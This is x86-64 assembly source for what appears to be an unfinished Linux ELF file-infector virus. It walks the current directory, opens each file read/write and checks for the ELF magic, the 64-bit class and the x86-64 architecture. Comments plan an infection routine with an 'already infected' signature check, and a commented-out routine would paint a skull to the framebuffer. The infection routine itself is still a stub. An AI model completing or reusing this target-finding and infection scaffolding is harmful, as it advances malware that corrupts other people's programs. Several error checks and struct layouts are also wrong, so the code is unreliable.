BITS 64


section .bss
	struc linuxdirent
		.d_ino:			resq 1
		.d_off:			resq 1
		.d_reclen:		resb 2
		.d_nameq:		resb 1
		.d_type:		resb 1
;		.d_padding:		resb 1
	endstruc
	
	struc file_stat
		.st_dev			resq 1	;ID of dev containing file
		.st_ino			resq 1	;inode #
		.st_mode		resq 1	;protection
		.st_nlink		resq 1	;# of hard links
		.st_uid			resq 1	;user id of owner
		.st_gid			resq 1	;group Id of owner
		.st_rdev		resq 1 	;dev ID 
		.st_size		resq 1	;total size in bytes
		.st_blksize		resq 1	; blocksize for fs i/o
		.st_blocks		resq 1	;# of 512b blocks allocated
		.st_atime		resq 1	;time of last file access
		.st_mtime		resq 1	;time of last file mod
		.st_ctime		resq 1	;time of last file status changea
	endstruc

	struc elf_ehdr
		.e_ident		resd 1		; unsigned char
		.ei_class		resb 1		; 
		.ei_data		resb 1		; 
		.ei_version		resb 1		; 
		.ei_osabi		resb 1		; 
		.ei_abiversion	resb 1		; 
		.ei_padding		resb 6		; bytes 10-15
		.e_type			resb 2		; uint16_t, bytes 16-17
		.e_machine		resb 2		; uint16_t, bytes 18-19
		.e_version		resw 1		; uint32_t
		.e_entry		resq 1		; ElfN_Addr
        .e_phoff		resq 1		; ElfN_Off 
        .e_shoff		resq 1		; ElfN_Off 
        .e_flags		resw 1		; uint32_t 
        .e_ehsize		resb 2		; uint16_t 
        .e_phentsize	resb 2		; uint16_t 
        .e_phnum		resb 2		; uint16_t 
        .e_shentsize	resb 2		; uint16_t 
        .e_shnum		resb 2		; uint16_t 
        .e_shstrndx		resb 2		; uint16_t 
	endstruc

	struc elf_phdr
		.p_type			resw 1		;  uint32_t   
		.p_flags		resw 1		;  uint32_t   
		.p_offset		resq 1		;  Elf64_Off  
		.p_vaddr		resq 1		;  Elf64_Addr 
		.p_paddr		resq 1		;  Elf64_Addr 
		.p_filesz		resq 1		;  uint64_t   
		.p_memsz		resq 1		;  uint64_t   
		.p_align		resq 1		;  uint64_t   
	endstruc

	struc elf_shdr
    	.sh_name		resw 1		; uint32_t   
    	.sh_type		resw 1		; uint32_t   
    	.sh_flags		resq 1		; uint64_t   
    	.sh_addr		resq 1		; Elf64_Addr 
     	.sh_offset		resq 1		; Elf64_Off  
     	.sh_size		resq 1		; uint64_t   
     	.sh_link		resw 1		; uint32_t   
     	.sh_info		resw 1		; uint32_t   
     	.sh_addralign	resq 1		; uint64_t   
     	.sh_entsize		resq 1		; uint64_t   
	endstruc



	;root_dirent: resb linuxdirent_size



section .data

;x64 syscall reference

SYS_READ 		equ 0x0
SYS_WRITE 		equ 0x1
SYS_OPEN 		equ 0x2
SYS_CLOSE 		equ 0x3
SYS_FSTAT 		equ 0x5
SYS_MMAP 		equ 0x9
SYS_PREAD64 	equ 0x11
SYS_PWRITE64 	equ 0x12
SYS_EXIT		equ 0x3c
SYS_GETDENTS64	equ 0x4e

teststr db 'boo', 13,10,0
teststrlen equ $-teststr

targetdir db '.',0
targetdirlen equ $-targetdir


;****************************************************************************************
; debug strings
;
;****************************************************************************************

checkelfpass db 'File is an ELF!', 13, 10, 0
checkelfpasslen equ $-checkelfpass

checkelffail db 'File is not an ELF!', 13, 10, 0
checkelffaillen equ $-checkelffail

checkfile_dtreg_fail db 'File is not a DTREG file!', 13, 10, 0
checkfiledtreg_fail_len equ $-checkfile_dtreg_fail

check64pass db 'File is an ELFCLASS64!', 13, 10, 0
check64passlen equ $-check64pass
check64fail db 'File is not an ELFCLASS64 booo :( going to next one', 13, 10, 0
check64faillen equ $-check64fail

checkarchpass db 'File is compiled for x86-64!', 13, 10, 0
checkarchpasslen equ $-checkarchpass
checkarchfail db 'File is not compiled for x86-64 booo :( going to next one', 13, 10, 0
checkarchfaillen equ $-checkarchfail


;****************************************************************************************

elf_header: times 4 dq 0
file_stat_temp: times 13 dq 0




fd:	dq 0
fdlen equ $-fd
;framebuffer:
;	db `//dev//fb0`,0
;framebuflen equ $-framebuffer
;;
STDOUT			equ 0x1


;open() syscall parameter reference 
OPEN_RDWR		equ 0x2
O_RDONLY		equ 0x0


S_IFREG    		dq 0x0100000   ;regular file
S_IFMT 			dq 0x0170000

;mode 		dd 0
;S_ISREG		equ (mode & S_IFMT)
;;%define S_ISREG(x)	(x&S_IFMT==S_IFREG)
;%define S_ISREG(x)	x & S_IFMT
;;see: https://stackoverflow.com/questions/40163270/what-is-s-isreg-and-what-does-it-do#:~:text=S_ISREG()%20is%20a%20macro,stat)%20is%20a%20regular%20file


PROT_READ		equ 0x1
PROT_WRITE		equ 0x2
MAP_PRIVATE		equ 0x2

;ELF header vals
ELFCLASS64 		equ 0x2

;D_TYPE values
DT_REG 			equ 0x8

;MAX_RDENT_BUF:	db 0x200 dup (?)
MAX_RDENT_BUF	times 0x400 db 0 
MAX_RDENT_BUF_SIZE equ 0x400

num_dir_entries resq 0x0
root_dirent:	dq 0 
;	istruc linuxdirent iend
;times 0x400 db 0 
;dw 0x200

;;file pointed to by fstat is fd
section .text
global _start
_start:
	push rbp
	mov rbp, rsp
	sub rsp, 0x600
	mov r14, rsp

	_getdirents:
;****************************************************************************************
; open - syscall 0x2
;;open(filename, flags, mode);
;;rdi == filename
;;rsi == flags
;rdx == mode
;; returns: fd (in rax, obv)
;****************************************************************************************
	;push "."
	;pop rdi
	mov rdi, targetdir
	xor rsi, rsi 		;no flags
	add rsi, 0x02000000
	mov rdx, O_RDONLY	;open read-only
	mov rax, SYS_OPEN
	syscall
	
	mov r9, rax						;fd into r9
;	mov [fd], rax
;****************************************************************************************
; getdents64 - syscall 0x4e
;; getdents(unsigned int fd, struct linuxdirent *dirent, unsigned int count);
;;rdi == fd
;;rsi == *dirent
;rdx == count
;returns # entries in rax
;[r14 v+ 600 +dirent] holds the pointer to the first dirent struct
;so we can iterate through all dirent entries using the size field in this dirent struc
;as an offset for successive jumps in address space	
;****************************************************************************************
	;push r9
	;pop rdi
	mov rdi, rax
	lea rsi, [r14 + 600 + linuxdirent] ;r14 + 600 is location on the stack where we'll save our dirent struct
	mov rdx, MAX_RDENT_BUF_SIZE
	mov rax, SYS_GETDENTS64
	syscall


	mov r8, rax					;# of dirent entries in r8
	mov [root_dirent], rsi
	mov qword [r14 + 500], rax		;save # of dir entries to local var on stack
;****************************************************************************************
; close - syscall 0x3
;;close(fd);
;;rdi == fd (file descriptor)
;; returns: 0 on success (-1 on error)
;****************************************************************************************
	mov rdi, r9
	mov rax, SYS_CLOSE
	syscall
	
;	lea rsi,  [r14 + 600 + linuxdirent.d_nameq]
;	lea rdi, [r14 + 200] 
;	test_copy_filename:
;		movsb
;		cmp byte [rsi], 0x0
;		jne test_copy_filename
;	lea r13, [r14 + 200]
;	call _write
	xor rcx, rcx	
	jmp check_file

;	jmp printteststr
;****************************************************************************************
; write - syscall 0x1
;;rdi == fd (file descriptor)
;;rsi == const char* buf
;rdx == count (# of bytes to write)
;; returns: 0 on success (-1 on error)
;****************************************************************************************
_write:
		;lea rsi, [r14 + 600 + linuxdirent.d_nameq]
		xor rsi, rsi
		mov rdx, r12
		mov rsi, r13
		mov rdi, STDOUT
		mov rax, SYS_WRITE
		syscall
		ret
	
printteststr:
		lea rsi, teststr
		mov rdi, STDOUT
		mov rdx, teststrlen
		mov rax, SYS_WRITE
		syscall
		jmp _restore		

;****************************************************************************************
;check_file:
;	open file -> fstat file (get file size) - > use fstat.size for mmap call & mmap file	
;	upon successful mmap, close file
;	use mmaped file for checks to confirm that the target file satisfies the following:
;	1. the target file is an executable
;	2. the target file is an ELF
;	3. the target file is a 64-bit ELF
;	4. (optional, but requirement for rn): the target file is for x86_64 arch
;	5. the target file is not already infected (check w signature at known offset)
;	*If all of the following above conditions hold, then call the infection routine
;	Otherwise, continue looping through the remaining files in the directory
;
;****************************************************************************************
check_file:
	push rcx
	;nvm d_type might not be available; use the macros for fstat instead
	;cmp byte [rcx + r14 + 600 + linuxdirent.d_type + 1], DT_REG
;	cmp byte [rcx + r14 + 600 + linuxdirent.d_type ], DT_REG
	;cmp byte [rcx + r14 + 600 + linuxdirent.d_reclen - 1], DT_REG
;	jne checknext 
	check_elf:
	;	push rcx
		lea rdi, [rcx + r14 + 600 + linuxdirent.d_nameq]	;name of file in rdi
		mov rsi, OPEN_RDWR 					;flags - read/write in rsi
		xor rdx, rdx						;mode - 0
		mov rax, SYS_OPEN
		syscall

		cmp rax, 0
		jb checknext
;		test rax, rax
;		js checknext
		
		mov r9, rax
		mov r8, rax
		mov qword [r14 + 400], rax
		mov qword [fd], rax
	;	pop rcx
		
		xor r12, r12
		lea rdi, [r14 + 200] 
		lea rsi, [rcx + r14 + 600 + linuxdirent.d_nameq]
		.copy_filename:
			movsb
			inc r12
			cmp byte [rsi], 0x0
			jne .copy_filename

		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
		lea r13, [r14 + 200]
		call _write
		xor rax, rax
		;mov [r14 + 500], rax				;save fd to opened file at designated spot on the stack
	
		push r9
	get_filestat:
		lea rsi, [r14 + file_stat]
		;lea rsi, [file_stat_temp]
		mov rdi, r8
		;mov rdi, [fd]
		mov rax, SYS_FSTAT
		syscall
	
		;tbqf extracting this field and checking it is an infuriating piece of logic that is not working as expected
		; since this is so annoying, I'm skipping this check for rn
	
		;mov r12, checkfiledtreg_fail_len
		;lea r13, checkfile_dtreg_fail
		
		;mov r10, [r14 + file_stat.st_mode]
		;mov [mode], r10
		;mov r10, S_ISREG(r10)
		;cmp S_ISREG, S_IFREG	
		;cmp r10, 0x1
		;mov rax, [r14+file_stat.st_mode]
		;and r10, [S_IFMT]
		;mov r9, [S_IFREG]
		;cmp r10, r9
		
		
		;jne checknext
		
		;void *mmap(void addr[.length], size_t length, int prot, int flags,
		;                  int fd, off_t offset);
	mmap_file:
		xor rdi, rdi			;set RDI to NULL
		mov qword rsi, [r14 + file_stat.st_size]
		;mov qword rsi, [file_stat_temp + 56]
		;mov rsi, [file_stat_temp + 56]
		mov rdx, 0x3 			; (PROT_READ | PROT_WRITE)
		mov r10, MAP_PRIVATE
		;mov r8, r9
		;mov r8, fd				;fd is already in r8 so this mov is unnecessary
		xor r9, r9				;offset of 0 within file == start of file, obv	
		mov rax, SYS_MMAP
		syscall
		
		cmp rax, 0
		jb checknext
	
		mov r8, rax
		;mov [r14 + 800 + elf_ehdr], rax			;rax contains address of new mapping upon return from syscall
		mov [r14 + 800], rax			;rax contains address of new mapping upon return from syscall
		pop r9
		push rax
	read_elf_header:
		;mov rdi, [fd]
		mov rdi, r9
		lea rsi, [elf_header]
		mov rdx, 64
		xor r10, r10
		mov rax, SYS_PREAD64
		syscall

	close_curr_file:
		;mov rdi, [r14+400]
		mov rdi, r9
		mov rax, SYS_CLOSE
		syscall
	
		pop rax
		cmp rax, 0
		jb checknext
		;test rax, rax
		;js checknext
	check_elf_header_magic_bytes:
		;cmp dword [r14+800+elf_ehdr.e_ident], 0x464c457f
		lea r13, checkelffail
		;lea r13, [rax + elf_ehdr.e_ident]
		;mov r12, 8
		mov r12, checkelffaillen
		;cmp dword [r14 + 800 + elf_ehdr.e_ident], 0x464c457f
		;cmp dword [r8 + elf_ehdr.e_ident], 0x464c457f
		cmp dword [rax + elf_ehdr.e_ident], 0x464c457f
	
		;lea rax, elf_header
		;cmp dword [rax], 0x464c457f
		;cmp dword [elf_header], 0x464c457f
		jnz checknext
		lea r13, checkelfpass
		mov r12, checkelfpasslen
		call _write
	check_elf_header_64bit:
		;cmp dword [r14+800+elf_ehdr.e_ident+4], ELFCLASS64
		lea r13, check64fail
		mov r12, check64faillen
		cmp byte [elf_header+4], ELFCLASS64
		jne checknext
		lea r13, check64pass
		mov r12, check64passlen
		call _write
;		jmp _restore
	
	check_elf_header_arch:
		lea r13, checkarchfail
		mov r12, checkarchfaillen
		cmp byte [elf_header+18], 0x3e
		jne checknext
		lea r13, checkarchpass
		mov r12, checkarchpasslen
		call _write
		jmp _restore
		
;		ready2infect:
;			call infect	



	checknext:
		;mov r12, checkfiledtreg_fail_len
		;lea r13, checkfile_dtreg_fail
		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
		call _write
		pop rcx
		add cx, [rcx + r14 + 600 + linuxdirent.d_reclen]
		;add rcx, edx
		cmp qword rcx, [r14 + 500]
		jne check_file
		jmp _restore
			
;****************************************************************************************
;	Infection routine:
;
;
;****************************************************************************************

infect:
	jmp printteststr
	

;;restore stack to original state
_restore:
	add rsp, 0x600
	pop rbp
	
;exit
_end:
	xor rdi, rdi
	mov rax, 0x3c ;exit() syscall on x64
	syscall	


;****************************************************************************************
;	paint function, writes buffer of 4 byte values (R G B Alpha) pixels to framebuffer
;	where framebuffer is a device at /dev/fb0
;
;****************************************************************************************
;	
;paint:
;		mov rax, 0x3062662f7665642f  ;/dev/fb0 in little-endian
;		mov [r14 + 100], rax
;		lea rdi, [r14 + 100]
;		xor rsi, rsi 		;no flags
;		add rsi, 0x02000000
;		mov rdx, O_RDONLY	;open read-only
;		mov rax, SYS_OPEN
;		syscall
;		
;		mov r9, rax
;		mov rdi, rax
;		mov rsi, skullbitmap
;		mov rdx, paintlen
;		mov rax, SYS_WRITE
;		syscall
;
;		mov rdi, r9
;		mov rax, SYS_CLOSE
;		syscall
;		ret
	


